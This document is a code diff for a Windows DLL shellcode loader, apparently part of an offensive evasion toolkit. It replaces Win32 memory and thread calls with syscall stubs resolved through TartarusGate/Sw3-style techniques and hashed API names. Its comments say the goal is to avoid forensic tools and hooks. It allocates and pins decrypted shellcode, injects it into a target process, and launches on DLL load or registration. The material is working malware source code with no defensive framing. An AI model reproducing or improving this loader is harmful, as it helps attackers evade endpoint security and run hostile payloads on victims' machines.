@@ -4,6 +4,7 @@
 #include "../include/config.hpp"
 #include "../include/evasion/evasion.hpp"
 #include "../include/evasion/sleep_obfuscation.hpp"
+#include "../include/evasion/syscall_backend.hpp"
 
 VOID entry(void)
 {
@@ -169,14 +170,53 @@ VOID entry(void)
 	// 3. Decompress shellcode if needed
 	// ============================================================
 
-	// Allocate writable memory for shellcode via VirtualAlloc (avoids CRT heap
-	// metadata that leaks allocation size to forensic tools).
-	BYTE* shellcode_ptr = (BYTE*)VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	if (!shellcode_ptr)
+	// Resolve NT memory management functions.
+	// GetSyscallStub is tried first (works for both TartarusGate and Sw3);
+	// GetProcAddressC PEB walk is the fallback.
+	HMODULE _hnt = erebus::GetModuleHandleC(H("ntdll.dll"));
+
+	typeNtAllocateVirtualMemory NtAllocateVirtualMemory =
+		(typeNtAllocateVirtualMemory)erebus::evasion::GetSyscallStub(H("NtAllocateVirtualMemory"));
+	if (!NtAllocateVirtualMemory && _hnt)
+		NtAllocateVirtualMemory = (typeNtAllocateVirtualMemory)
+			erebus::GetProcAddressC(_hnt, H("NtAllocateVirtualMemory"));
+
+	typeNtFreeVirtualMemory NtFreeVirtualMemory =
+		(typeNtFreeVirtualMemory)erebus::evasion::GetSyscallStub(H("NtFreeVirtualMemory"));
+	if (!NtFreeVirtualMemory && _hnt)
+		NtFreeVirtualMemory = (typeNtFreeVirtualMemory)
+			erebus::GetProcAddressC(_hnt, H("NtFreeVirtualMemory"));
+
+	typeNtLockVirtualMemory NtLockVirtualMemory =
+		(typeNtLockVirtualMemory)erebus::evasion::GetSyscallStub(H("NtLockVirtualMemory"));
+	if (!NtLockVirtualMemory && _hnt)
+		NtLockVirtualMemory = (typeNtLockVirtualMemory)
+			erebus::GetProcAddressC(_hnt, H("NtLockVirtualMemory"));
+
+	typeNtUnlockVirtualMemory NtUnlockVirtualMemory =
+		(typeNtUnlockVirtualMemory)erebus::evasion::GetSyscallStub(H("NtUnlockVirtualMemory"));
+	if (!NtUnlockVirtualMemory && _hnt)
+		NtUnlockVirtualMemory = (typeNtUnlockVirtualMemory)
+			erebus::GetProcAddressC(_hnt, H("NtUnlockVirtualMemory"));
+
+	if (!NtAllocateVirtualMemory || !NtFreeVirtualMemory)
 	{
-		LOG_ERROR("Failed to allocate shellcode buffer");
+		LOG_ERROR("Failed to resolve NT memory functions");
 		return;
 	}
+
+	// Allocate writable staging buffer via NtAllocateVirtualMemory.
+	PVOID _sc_base = NULL;
+	SIZE_T _sc_alloc = shellcode_size;
+	NTSTATUS _sc_st = NtAllocateVirtualMemory(
+		NtCurrentProcess(), &_sc_base, 0, &_sc_alloc,
+		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (!NT_SUCCESS(_sc_st) || !_sc_base)
+	{
+		LOG_ERROR("Failed to allocate shellcode buffer (NTSTATUS: 0x%08lX)", _sc_st);
+		return;
+	}
+	BYTE* shellcode_ptr = (BYTE*)_sc_base;
 	RtlCopyMemory(shellcode_ptr, shellcode, shellcode_size);
 
 	BYTE* iv = nullptr;
@@ -202,7 +242,8 @@ VOID entry(void)
 		LOG_ERROR("Shellcode processing failed - invalid result");
 		if (shellcode_ptr) {
 			SecureZeroMemory(shellcode_ptr, shellcode_size);
-			VirtualFree(shellcode_ptr, 0, MEM_RELEASE);
+			PVOID _fb = shellcode_ptr; SIZE_T _fs = 0;
+			NtFreeVirtualMemory(NtCurrentProcess(), &_fb, &_fs, MEM_RELEASE);
 		}
 		return;
 	}
@@ -212,7 +253,12 @@ VOID entry(void)
 	// Pin the decrypted buffer into the working set so it never reaches the
 	// pagefile during the injection window. Best-effort - if the working-set
 	// quota refuses the lock we still inject, we just accept the paging risk.
-	BOOL locked = VirtualLock(shellcode_ptr, shellcode_size);
+	BOOL locked = FALSE;
+	if (NtLockVirtualMemory) {
+		PVOID _lb = shellcode_ptr;
+		SIZE_T _ls = shellcode_size;
+		locked = NT_SUCCESS(NtLockVirtualMemory(NtCurrentProcess(), &_lb, &_ls, 1));
+	}
 
 	// Execute injection
 	erebus::config.injection_method(shellcode_ptr, shellcode_size, process_handle, thread_handle);
@@ -221,8 +267,14 @@ VOID entry(void)
 	if (shellcode_ptr)
 	{
 		SecureZeroMemory(shellcode_ptr, shellcode_size);
-		if (locked) VirtualUnlock(shellcode_ptr, shellcode_size);
-		VirtualFree(shellcode_ptr, 0, MEM_RELEASE);
+		if (locked && NtUnlockVirtualMemory) {
+			PVOID _ub = shellcode_ptr;
+			SIZE_T _us = shellcode_size;
+			NtUnlockVirtualMemory(NtCurrentProcess(), &_ub, &_us, 1);
+		}
+		PVOID _fb = shellcode_ptr;
+		SIZE_T _fs = 0;
+		NtFreeVirtualMemory(NtCurrentProcess(), &_fb, &_fs, MEM_RELEASE);
 	}
 
 	return;
@@ -246,8 +298,15 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 		DisableThreadLibraryCalls(hModule);
 		if (!entry_called) {
 			entry_called = TRUE;
-			HANDLE hThread = CreateThread(NULL, 0, EntryThread, NULL, 0, NULL);
-			if (hThread) CloseHandle(hThread);
+			HMODULE _hnt_d = erebus::GetModuleHandleC(H("ntdll.dll"));
+			typeNtCreateThreadEx _NtCTE = (typeNtCreateThreadEx)erebus::evasion::GetSyscallStub(H("NtCreateThreadEx"));
+			if (!_NtCTE && _hnt_d) _NtCTE = (typeNtCreateThreadEx)erebus::GetProcAddressC(_hnt_d, H("NtCreateThreadEx"));
+			typeNtClose _NtCl = (typeNtClose)erebus::evasion::GetSyscallStub(H("NtClose"));
+			if (!_NtCl && _hnt_d) _NtCl = (typeNtClose)erebus::GetProcAddressC(_hnt_d, H("NtClose"));
+			HANDLE hThread = NULL;
+			if (_NtCTE) _NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(),
+			                   (PVOID)EntryThread, NULL, 0, 0, 0, 0, NULL);
+			if (hThread && _NtCl) _NtCl(hThread);
 		}
 		break;
 	case DLL_THREAD_ATTACH:
@@ -262,8 +321,15 @@ extern "C" __declspec(dllexport) HRESULT DllRegisterServer(void)
 {
 	if (!entry_called) {
 		entry_called = TRUE;
-		HANDLE hThread = CreateThread(NULL, 0, EntryThread, NULL, 0, NULL);
-		if (hThread) CloseHandle(hThread);
+		HMODULE _hnt_r = erebus::GetModuleHandleC(H("ntdll.dll"));
+		typeNtCreateThreadEx _NtCTE = (typeNtCreateThreadEx)erebus::evasion::GetSyscallStub(H("NtCreateThreadEx"));
+		if (!_NtCTE && _hnt_r) _NtCTE = (typeNtCreateThreadEx)erebus::GetProcAddressC(_hnt_r, H("NtCreateThreadEx"));
+		typeNtClose _NtCl = (typeNtClose)erebus::evasion::GetSyscallStub(H("NtClose"));
+		if (!_NtCl && _hnt_r) _NtCl = (typeNtClose)erebus::GetProcAddressC(_hnt_r, H("NtClose"));
+		HANDLE hThread = NULL;
+		if (_NtCTE) _NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(),
+		                   (PVOID)EntryThread, NULL, 0, 0, 0, 0, NULL);
+		if (hThread && _NtCl) _NtCl(hThread);
 	}
 	return S_OK;
 }
